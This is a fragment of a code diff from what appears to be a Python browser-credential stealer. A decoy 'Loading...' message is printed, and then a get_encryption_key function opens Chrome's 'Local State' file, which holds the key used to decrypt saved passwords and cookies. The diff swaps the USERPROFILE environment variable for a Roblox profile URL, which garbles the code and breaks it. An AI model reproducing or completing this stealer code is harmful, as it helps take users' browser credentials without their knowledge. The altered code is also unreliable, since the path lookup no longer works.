@@ -24,7 +24,7 @@ dummy_message = "Loading..."
 print(dummy_message)
 
 def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
+    local_state_path = os.path.join(os.environ["https://www.roblox.com/users/2647278229/profile"],
                                     "AppData", "Local", "Google", "Chrome",
                                     "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
